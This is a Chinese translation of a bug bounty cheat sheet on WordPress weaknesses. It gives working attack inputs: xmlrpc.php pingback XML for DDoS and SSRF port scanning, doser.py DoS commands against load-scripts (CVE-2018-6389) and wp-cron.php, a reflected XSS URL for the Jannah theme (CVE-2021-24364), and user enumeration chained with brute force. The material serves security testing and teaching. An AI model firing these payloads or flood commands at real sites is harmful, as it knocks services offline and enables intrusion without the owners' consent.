# 参考

[原文](https://github.com/KathanP19/HowToHunt/blob/master/CMS/wordpress.md)



# Wordpress 常见配置错误

# Index

- Wordpress 检测
- 通用扫描工具
- xmlrpc.php
- 目录扫描
- CVE-2018-6389
- CVE-2021-24364
- WP Cornjob DOS
- WP 用户枚举



# Wordpress 探测

- Wappalyzer  浏览器插件
- WhatRuns  浏览器插件
- BuildWith  在线网站



## 常规的扫描工具

- wpscan  一款强大的针对wordpress的扫描工具

在kali上安装

```
sudo apt update
sudo apt install wpscan
```

为了能够使用其强大的漏洞数据库，WPScan 需要一个 API 密钥。**没有这个密钥，漏洞检测功能将非常有限**。

1. 访问 [Patchstack 官网](https://www.google.com/search?q=https://patchstack.com/database/api/) (原 WPScan 漏洞数据库的提供方)。
2. 注册一个免费账户。
3. 在你的账户仪表盘中，你会找到一个 API Token (API 密钥)。
4. 在运行扫描时，使用 `--api-token` 参数来提供你的密钥。



扫描命令:

```
wpscan --url http://example.com --enumerate vp,vt,u --api-token YOUR_API_TOKEN
```



# xmlrpc.php

这是WordPress上常见的问题之一。要想利用这个错误配置赚钱，你必须充分利用它，并且必须正确地展示其影响。



### 探测

- 访问 site.com/xmlrpc.php
- 仅获取 POST 请求的错误消息

### 利用步骤

- 拦截请求并将方法 GET 更改为 POST
- 列出所有方法

```
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

- 检查 pingback.ping 指令是否存在
- 执行 DDOS

```
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```

- 执行 SSRF（仅限内部 PORT 扫描）

```
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```

### 自动化 XMLRPC 扫描的工具

[XMLRPC-Scan](https://github.com/nullfil3/xmlrpc-scan)

### 文章

[Bug Bounty Cheat Sheet](https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html)

[Medium Writeup](https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32)

[WpEngine Blog Post](https://wpengine.com/resources/xmlrpc-php/)



# 目录列表

有时开发人员会忘记禁用 /wp-content/uploads 上的目录列表。这是 WordPress 网站上常见的问题。

## 检测

/wp-content/uploads

## 专业提示

将此路径添加到您的模糊测试词汇表

## 参考资料

[H1 Report](https://hackerone.com/reports/201984) [H1 Report](https://hackerone.com/reports/762118) [H1 Report](https://hackerone.com/reports/789388) [H1 Report](https://hackerone.com/reports/448985)



# CVE-2018-6389

此问题可能导致任何低于 4.9.3 版本的 WordPress 网站瘫痪。因此，在报告漏洞时，请确保目标网站运行的是低于 4.9.3 版本的 WordPress。

## 检测

使用我 gist 中名为 loadsxploit 的 URL，您将收到大量的 js 响应数据。

[loadsxploit](https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9)

## 漏洞利用

您可以使用任何 Dos 工具，我发现 Doser 速度非常快，它可以在 30 秒内关闭 Web 服务器。

[Doser](https://github.com/quitten/doser.py)

`python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'`

## 参考资料

[H1 Report](https://hackerone.com/reports/752010)

[CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389)

[Blog Post](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)



# CVE-2021-24364

Jannah WordPress 主题 5.4.4 之前的版本未在其 tie_get_user_weather AJAX 操作中正确清理选项 JSON 参数，然后将其输出回页面，从而导致反射型跨站脚本 (XSS) 漏洞。

## 检测与利用

- 将 `<Your_WP-Site-here>` 替换为您的 WP 站点` <Your_WP-Site-here>/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7`
- 等待弹出窗口！

## 参考

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-24364)



# WP Cornjob DOS

这是另一个可以进行 DOS 攻击的地方。

## 检测

- 访问 site.com/wp-cron.php
- 您将看到一个空白页面，HTTP 状态代码为 200

## 漏洞利用

您可以使用相同的工具 Doser 来利用此漏洞

`python3 doser.py -t 999 -g 'https://site.com/wp-cron.php'`

## 参考

[GitHub Issue](https://github.com/wpscanteam/wpscan/issues/1299)

[Medium Writeup](https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30)



# WP 用户枚举

仅当目标网站隐藏当前用户或用户信息不公开时，此漏洞才会被接受。因此，攻击者可以利用这些用户数据进行暴力破解和其他操作。

## 检测

- 访问 site.com/wp-json/wp/v2/users/
- 您将在响应中看到包含用户信息的 JSON 数据。

## 漏洞利用

如果您的 xmlrpc.php 文件和此 User 枚举都已存在，则可以从 wp-json 文件收集用户名，并通过 xmlrpc.php 文件对其进行暴力破解。这肯定会增加额外的工作量，并增强攻击效果。

## 参考

[H1 Report](https://hackerone.com/reports/356047)

## 研究人员备注

请不要完全依赖这些问题。我看到有人只关注这些问题，而没有关注其他问题。在测试其他漏洞时，可以参考这些问题，而且大多数情况下，它们可以与其他低级别漏洞进行串联。
